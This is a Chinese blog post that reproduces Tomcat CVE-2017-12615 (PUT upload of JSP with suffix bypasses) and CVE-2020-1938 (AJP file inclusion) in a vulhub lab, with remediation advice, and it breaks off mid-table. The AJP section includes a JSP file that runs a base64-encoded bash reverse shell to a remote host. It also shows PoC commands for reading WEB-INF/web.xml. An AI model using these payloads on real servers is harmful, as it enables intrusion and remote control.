<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Tomcat漏洞总结复现 | 1ance's blog</title><meta name="keywords" content="漏洞,中间件,Tomcat"><meta name="author" content="1ance"><meta name="copyright" content="1ance"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="简介 Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、">
<meta property="og:type" content="article">
<meta property="og:title" content="Tomcat漏洞总结复现">
<meta property="og:url" content="https://blog.1ance.xyz/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="1ance&#39;s blog">
<meta property="og:description" content="简介 Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.1ance.xyz/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/tomcat.jpg">
<meta property="article:published_time" content="2021-09-26T05:26:56.000Z">
<meta property="article:modified_time" content="2021-10-07T09:08:46.937Z">
<meta property="article:author" content="1ance">
<meta property="article:tag" content="漏洞">
<meta property="article:tag" content="中间件">
<meta property="article:tag" content="Tomcat">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.1ance.xyz/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/tomcat.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.1ance.xyz/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Tomcat漏洞总结复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-10-07 17:08:46'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/header.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">1ance's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Tomcat漏洞总结复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-09-26T05:26:56.000Z" title="发表于 2021-09-26 13:26:56">2021-09-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-10-07T09:08:46.937Z" title="更新于 2021-10-07 17:08:46">2021-10-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Tomcat漏洞总结复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
<p>Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。<br>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。诀窍是，当配置正确时，Apache 为HTML页面服务，而Tomcat 实际上运行JSP 页面和Servlet。另外，Tomcat和IIS等Web服务器一样，具有处理HTML页面的功能，另外它还是一个Servlet和JSP容器，独立的Servlet容器是Tomcat的默认模式。不过，Tomcat处理静态HTML的能力不如Apache服务器。目前Tomcat最新版本为10.0.5。<br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/tomcat/255751?fr=aladdin">百度百科</a></p>
</blockquote>
<h2 id="Tomcat目录结构及介绍"><a href="#Tomcat目录结构及介绍" class="headerlink" title="Tomcat目录结构及介绍"></a>Tomcat目录结构及介绍</h2><p><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926223055908.png" alt="image-20210926223055908"></p>
<ol>
<li><strong>bin目录</strong><br>主要是存放一些可执行的二进制文件,.sh后缀的为linux下执行命令，.bat后缀的为windows下执行的批处理命令。</li>
</ol>
<ul>
<li>catalina.sh: 真正启动tomcat文件，可以在里面设置jvm参数。</li>
<li>startup.sh：启动tomcat（需事先配置好JAVA_HOME环境变量才可启动，该命令源码实际执行的为catalina.sh start）。</li>
<li>shutdown.sh：关闭tomcat。</li>
<li>version.sh：查看tomcat版本相关信息。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926224036261.png" alt="image-20210926224036261"></li>
</ul>
<ol start="2">
<li><strong>conf目录</strong><br>tomcat的配置文件。</li>
</ol>
<ul>
<li>server.xml核心配置文件：修改端口号，设置域名或IP、默认加载的项目，添加编码格式等。</li>
<li>context.xml内容配置文件：监视并加载资源文件，当监视文件发生变化时，自动加载，一般不需要配置，保持默认即可。</li>
<li>web.xml：web应用相关通用配置，如配置servlet、添加过滤器、设置session过期时间、设置tomcat支持的文件类型等。</li>
<li>tomcat-users.xml：用来配置管理tomcat的用户配置文件，配置用户名，密码，用户具备权限等。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926230104055.png" alt="image-20210926230104055"></li>
</ul>
<ol start="3">
<li><strong>logs目录</strong><br>存放tomcat运行时产生的日志文件。</li>
</ol>
<ul>
<li>在windows环境中，日志文件输出到catalina.xxxx-xx-xx.log文件中。</li>
<li>在linux环境中，日志文件输出到catalina.out文件中。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926230952732.png" alt="image-20210926230952732"><table>
<thead>
<tr>
<th>文件名</th>
<th>内容</th>
</tr>
</thead>
<tbody><tr>
<td>catalina.xxxx-xx-xx.log</td>
<td>windows下日志文件输出内容</td>
</tr>
<tr>
<td>host-manager.xxxx-xx-xx.log</td>
<td>访问webapps下host-manager项目日志</td>
</tr>
<tr>
<td>localhost.xxxx-xx-xx.log</td>
<td>tomcat启动时，自身访问服务，只记录tomcat访问日志，而非业务项目日志</td>
</tr>
<tr>
<td>localhost_access_log.xxxx-xx-xx.txt</td>
<td>表示访问tomcat下所有项目日志记录</td>
</tr>
<tr>
<td>manager.xxxx-xx-xx.log</td>
<td>访问webapps下manager项目日志</td>
</tr>
</tbody></table>
</li>
</ul>
<ol start="4">
<li><strong>temp目录</strong><br>用户存放tomcat在运行过程中产生的临时文件（清空不会对tomcat运行带来影响）。</li>
<li><strong>webapps目录</strong><br>用来存放应用程序，当tomcat启动时会去加载webapps目录下的应用程序。可以以文件夹、war包、jar包的形式发布应用。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926231242908.png" alt="image-20210926231242908"><br>examples文件夹是tomcat默认的实例文件，一般不需要都可以直接删除。<br>ROOT目录下就是实际显示的网页文件。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926231350930.png" alt="image-20210926231350930"></li>
<li><strong>work目录</strong><br>用来存放tomcat在运行时的编译后文件，例如JSP编译后的文件。<br>清空work目录，然后重启tomcat，可以达到清除缓存的作用。</li>
</ol>
<h1 id="CVE-2017-12615任意文件上传"><a href="#CVE-2017-12615任意文件上传" class="headerlink" title="CVE-2017-12615任意文件上传"></a>CVE-2017-12615任意文件上传</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
<p>当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p>
</blockquote>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>由于配置不当（非默认配置），将配置文件 conf /web.xml 中的 readonly 设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀的上传<br>根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。<br>通过阅读 conf/web.xml 文件，可以发现，默认 readonly 为 true，当 readonly 设置为false 时，可以通过 PUT / DELETE 进行文件操控。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote>
<p>Apache Tomcat 7.0.0 - 7.0.79 (windows环境)</p>
</blockquote>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>环境：<br>使用vulhub的环境，docker启动，节省时间。<br>进入漏洞环境对应目录后：<code>docker-compose up -d</code><br>进入容器目录：<code>docker exec -it 容器id bash</code><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926233252884.png" alt="image-20210926233252884"><br>vulhub提供的版本是8.5.19，但不影响漏洞复现，如果是7.0.*版本复现的话，需要手动添加<code>&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;</code>。<br>访问<a target="_blank" rel="noopener" href="http://192.168.255.128:8080/">http://192.168.255.128:8080</a><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926233534341.png" alt="image-20210926233534341"><br>使用burp获取数据包。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926233636964.png" alt="image-20210926233636964"><br>将GET改成PUT，上传一个txt文件测试。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926233854084.png" alt="image-20210926233854084"><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926233943958.png" alt="image-20210926233943958"><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926234012131.png" alt="image-20210926234012131"><br>尝试上传jsp文件，但是发现上传失败了。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926234135621.png" alt="image-20210926234135621"></p>
<blockquote>
<p>默认 tomcat 也不允许 PUT 上传 jsp 和 jspx 文件的，因为后端都用<code>org.apache.jasper.servlet.JspServlet</code> 来处理 jsp 或是 jspx 后缀的请求了，而 JspServlet 中没有 PUT 上传的逻辑，PUT 的代码实现只存在于 DefaultServlet 中。</p>
</blockquote>
<p>所以我们需要通过构造特殊后缀名，绕过了 tomcat 检测，让它用 DefaultServlet 的逻辑去处理请求，从而上传 jsp 文件。</p>
<p>目前主要三种方法：</p>
<blockquote>
<p>1、Windows下不允许文件以空格结尾 以PUT /1.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格。<br>2、Windows NTFS流 PUT /1.jsp::$DATA HTTP/1.1<br>3、/在文件名中是非法的，也会被去除（Linux/Windows） PUT /1.jsp/ http:/1.1</p>
</blockquote>
<ol>
<li><strong>加上%20再上传，成功绕过。</strong><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926234954881.png" alt="image-20210926234954881"><br>但是因为环境是在linux上的，后面的空格没有去除，导致不能解析jsp文件，但是在windows上可以解析。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926235644395.png" alt="image-20210926235644395"><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210926235900538.png" alt="image-20210926235900538"></li>
<li><strong>利用Windows NTFS流：添加::$DATA，上传成功。</strong><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927000042547.png" alt="image-20210927000042547"><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927000205895.png" alt="image-20210927000205895"></li>
<li><strong>添加/,上传成功。</strong><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927000311764.png" alt="image-20210927000311764"><br>用冰蝎连接。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927000408827.png" alt="image-20210927000408827"><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2>1、根据业务评估配置 conf/webxml 文件的 readOnly 值为 Ture 或注释参数，禁用 PUT 方法并重启 tomcat 服务，临时规避安全风险；注意： 如果禁用 PUT 方法，对于依赖PUT方法的应用，可能导致业务失效。<br>2、目前官方已经发布了 7.0.81 版本修复了两个漏洞，建议用户尽快升级到最新版本；</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/399/">CVE-2017-12615/CVE-2017-12616:Tomcat信息泄漏和远程代码执行漏洞分析报告</a></p>
<h1 id="CVE-2020-1938文件包含"><a href="#CVE-2020-1938文件包含" class="headerlink" title="CVE-2020-1938文件包含"></a>CVE-2020-1938文件包含</h1><h2 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
<p>CVE-2020-1938为Tomcat AJP文件包含漏洞。由长亭科技安全研究员发现的存在于 Tomcat中的安全漏洞，由于 Tomcat AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector可以读取或包含 Tomcat上所有 webapp目录下的任意文件，例如可以读取 webapp配置文件或源码。<br>此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p>
</blockquote>
<h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Tomcat 配置了两个Connector，它们分别是 HTTP 和 AJP ：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP 协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shell。<br>tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927002234299.png" alt="image-20210927002234299"><br>tomcat在接收ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor来处理ajp消息， prepareRequest将ajp里面的内容取出来设置成request对象的Attribute属性，因此可以通过此种特性从而可以控制request对象的下面三个Attribute属性。</p>
<blockquote>
<p>javax.servlet.include.request_uri<br>javax.servlet.include.path_info<br>javax.servlet.include.servlet_path</p>
</blockquote>
<h2 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote>
<ul>
<li>Apache Tomcat 6</li>
<li>Apache Tomcat 7 &lt; 7.0.100</li>
<li>Apache Tomcat 8 &lt; 8.5.51</li>
<li>Apache Tomcat 9 &lt; 9.0.31</li>
</ul>
</blockquote>
<h2 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h2><p>环境：vulhub<br><code>docker-compose up -d</code><br>访问<a target="_blank" rel="noopener" href="http://192.168.255.128:8080/">http://192.168.255.128:8080</a><br>版本为9.0.30，在受影响范围内。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927002718010.png" alt="image-20210927002718010"><br>下载POC进行漏洞检测</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git</span><br><span class="line"><span class="built_in">cd</span> CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.255.128 -f /WEB-INF/web.xml -p 8009</span><br></pre></td></tr></table></figure>
<p>成功读取/WEB-INF/web.xml文件内容，存在文件包含漏洞。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927123019378.png" alt="image-20210927123019378"><br>这里模拟存在文件上传漏洞，直接上传一个反弹shell。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927135001269.png" alt="image-20210927135001269"><br>1.jsp文件内容为：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">   java.io.InputStream in=Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3cC8xNTUuOTQuMTg0LjIwMi8xMDA4NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>).getInputStream();</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] b= <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NS4xMjgvMTAwODYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code><br>反弹payload需要进行编码转换：<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927135319379.png" alt="image-20210927135319379"><br>然后利用脚本通过漏洞包含1.jsp文件，成功反弹shell。（如果脚本包含文件后，迟迟没有反弹，直接浏览器访问上传的文件)<br><code>python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f 1.jsp 192.168.255.128</code><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927135700227.png" alt="image-20210927135700227"><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927134645039.png" alt="image-20210927134645039"></p>
<h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><ol>
<li>目前官方已在最新版本中修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接：</li>
</ol>
<table>
<thead>
<tr>
<th>版本</th>
<th>链接</th>
</tr>
</thead>
<tbody><tr>
<td>Apache Tomcat 7.0.100</td>
<td><a target="_blank" rel="noopener" href="http://tomcat.apache.org/download-70.cgi">http://tomcat.apache.org/download-70.cgi</a></td>
</tr>
<tr>
<td>Apache Tomcat 8.5.51</td>
<td><a target="_blank" rel="noopener" href="http://tomcat.apache.org/download-80.cgi">http://tomcat.apache.org/download-80.cgi</a></td>
</tr>
<tr>
<td>Apache Tomcat 9.0.31</td>
<td><a target="_blank" rel="noopener" href="http://tomcat.apache.org/download-90.cgi">http://tomcat.apache.org/download-90.cgi</a></td>
</tr>
<tr>
<td>2. 如果相关用户暂时无法进行版本升级，可根据自身情况采用下列防护措施。</td>
<td></td>
</tr>
